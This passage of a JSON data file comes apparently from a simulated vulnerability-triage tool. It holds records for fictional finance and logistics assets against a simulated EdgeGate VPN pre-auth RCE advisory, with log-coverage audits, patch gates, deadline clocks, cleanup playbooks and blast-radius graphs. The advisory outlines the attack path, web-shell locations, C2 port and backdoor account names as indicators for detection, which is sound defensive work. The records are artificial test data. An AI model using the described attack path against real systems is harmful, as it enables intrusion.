          "source": "meridian-cred-vault",
          "target": "meridian-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "high"
        },
        {
          "source": "meridian-jump-host-01",
          "target": "meridian-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "meridian-dc-ad-01",
          "target": "meridian-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 88,
      "summary": "CRITICAL BLAST RADIUS ALERT: Host meridian-vpn-gw-01 possesses active Kerberos tickets and SSH keys capable of pivoting directly to Domain Controller (meridian-dc-ad-01) and Primary Database. Immediate VLAN isolation prevents tier-0 domain compromise."
    }
  },
  "ASSET-MERIDIAN-003": {
    "asset": {
      "id": "ASSET-MERIDIAN-003",
      "host_name": "meridian-web-portal-01",
      "tenant_id": "meridian-finance",
      "owner": "admin@meridianfinance.in",
      "product": "EdgeGate VPN",
      "version": "9.1.2",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.220",
      "exposure_tier": "emergency",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-MERIDIAN-003",
      "overall_coverage": 0.138,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 6,
          "coverage_ratio": 0.133,
          "gaps": [
            "Missing 39 days of historical telemetry (6/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 6,
          "coverage_ratio": 0.133,
          "gaps": [
            "Missing 39 days of historical telemetry (6/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 5,
          "coverage_ratio": 0.111,
          "gaps": [
            "Missing 40 days of historical telemetry (5/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 7,
          "coverage_ratio": 0.156,
          "gaps": [
            "Missing 38 days of historical telemetry (7/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 7,
          "coverage_ratio": 0.156,
          "gaps": [
            "Missing 38 days of historical telemetry (7/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": false,
      "blind_spots": [
        "WEB: Only 6 of 45 days available",
        "ENDPOINT: Only 6 of 45 days available",
        "AUTH: Only 5 of 45 days available",
        "NETWORK: Only 7 of 45 days available",
        "FILE: Only 7 of 45 days available"
      ],
      "recommendations": [
        "Extend log retention to at least 90 days across network edge and endpoint telemetry.",
        "Execute assume-breach triage because historical pre-disclosure activity cannot be verified.",
        "Deploy targeted host-level forensic collector to inspect physical disk and registry."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-MERIDIAN-003",
      "advisory_id": "SIM-2026-0001",
      "state": "Cannot verify",
      "confidence": "low",
      "reasons": [
        {
          "text": "Log coverage is only 13%, leaving unmonitored blind spots in WEB: Only 6 of 45 days available, ENDPOINT: Only 6 of 45 days available, AUTH: Only 5 of 45 days available, NETWORK: Only 7 of 45 days available, FILE: Only 7 of 45 days available across the required look-back window.",
          "evidence_ids": [
            "COVERAGE-AUDIT-01"
          ]
        },
        {
          "text": "Pre-disclosure compromise cannot be confirmed or ruled out due to incomplete telemetry; assume-breach controls apply.",
          "evidence_ids": [
            "COVERAGE-AUDIT-01"
          ]
        }
      ],
      "coverage_score": 0.138,
      "coverage_report": {
        "asset_id": "ASSET-MERIDIAN-003",
        "overall_coverage": 0.138,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 6,
            "coverage_ratio": 0.133,
            "gaps": [
              "Missing 39 days of historical telemetry (6/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 6,
            "coverage_ratio": 0.133,
            "gaps": [
              "Missing 39 days of historical telemetry (6/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 5,
            "coverage_ratio": 0.111,
            "gaps": [
              "Missing 40 days of historical telemetry (5/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 7,
            "coverage_ratio": 0.156,
            "gaps": [
              "Missing 38 days of historical telemetry (7/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 7,
            "coverage_ratio": 0.156,
            "gaps": [
              "Missing 38 days of historical telemetry (7/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": false,
        "blind_spots": [
          "WEB: Only 6 of 45 days available",
          "ENDPOINT: Only 6 of 45 days available",
          "AUTH: Only 5 of 45 days available",
          "NETWORK: Only 7 of 45 days available",
          "FILE: Only 7 of 45 days available"
        ],
        "recommendations": [
          "Extend log retention to at least 90 days across network edge and endpoint telemetry.",
          "Execute assume-breach triage because historical pre-disclosure activity cannot be verified.",
          "Deploy targeted host-level forensic collector to inspect physical disk and registry."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.077986+00:00",
      "verdict_hash": "e90977ad2934c8a770fbc29a41cf4839e3942accedcae4677499c9ef91d4298d"
    },
    "gate": {
      "asset_id": "ASSET-MERIDIAN-003",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch with caution",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner",
        "Analyst"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.077991+00:00"
    },
    "clock": {
      "asset_id": "ASSET-MERIDIAN-003",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.112913+00:00",
      "deadline_time": "2026-10-19T05:48:03.112913+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-MERIDIAN-003-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-MERIDIAN-003",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate meridian-web-portal-01 (192.0.2.220) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-MERIDIAN-003",
      "root_node_id": "meridian-web-portal-01",
      "nodes": [
        {
          "id": "meridian-web-portal-01",
          "label": "meridian-web-portal-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "meridian-web-portal-01",
          "target": "meridian-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "meridian-web-portal-01",
          "target": "meridian-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "meridian-cred-vault",
          "target": "meridian-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "meridian-jump-host-01",
          "target": "meridian-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "meridian-dc-ad-01",
          "target": "meridian-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-MERIDIAN-015": {
    "asset": {
      "id": "ASSET-MERIDIAN-015",
      "host_name": "meridian-unkn-asset-01",
      "tenant_id": "meridian-finance",
      "owner": "admin@meridianfinance.in",
      "product": "EdgeGate VPN",
      "version": "Unknown",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.187",
      "exposure_tier": "emergency",
      "status": "needs_inventory",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-MERIDIAN-015",
      "overall_coverage": 0.982,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": true,
      "blind_spots": [
        "ENDPOINT: Only 44 of 45 days available",
        "NETWORK: Only 44 of 45 days available",
        "FILE: Only 43 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-MERIDIAN-015",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 98% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-meridian-unkn-asset-01"
          ]
        }
      ],
      "coverage_score": 0.982,
      "coverage_report": {
        "asset_id": "ASSET-MERIDIAN-015",
        "overall_coverage": 0.982,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": true,
        "blind_spots": [
          "ENDPOINT: Only 44 of 45 days available",
          "NETWORK: Only 44 of 45 days available",
          "FILE: Only 43 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.082886+00:00",
      "verdict_hash": "e2f1d5118bf52d87e0ed504750a895c6308bd8ef6a695ae6231c9bbb357cac77"
    },
    "gate": {
      "asset_id": "ASSET-MERIDIAN-015",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.082891+00:00"
    },
    "clock": {
      "asset_id": "ASSET-MERIDIAN-015",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.112940+00:00",
      "deadline_time": "2026-10-19T05:48:03.112940+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-MERIDIAN-015-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-MERIDIAN-015",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate meridian-unkn-asset-01 (192.0.2.187) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-MERIDIAN-015",
      "root_node_id": "meridian-unkn-asset-01",
      "nodes": [
        {
          "id": "meridian-unkn-asset-01",
          "label": "meridian-unkn-asset-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "meridian-unkn-asset-01",
          "target": "meridian-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "meridian-unkn-asset-01",
          "target": "meridian-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "meridian-cred-vault",
          "target": "meridian-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "meridian-jump-host-01",
          "target": "meridian-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "meridian-dc-ad-01",
          "target": "meridian-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-HARBOR-001": {
    "asset": {
      "id": "ASSET-HARBOR-001",
      "host_name": "harbor-vpn-gw-01",
      "tenant_id": "harbor-logistics",
      "owner": "admin@harborlogistics.in",
      "product": "EdgeGate VPN",
      "version": "9.1.4",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.44",
      "exposure_tier": "emergency",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-HARBOR-001",
      "overall_coverage": 0.991,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
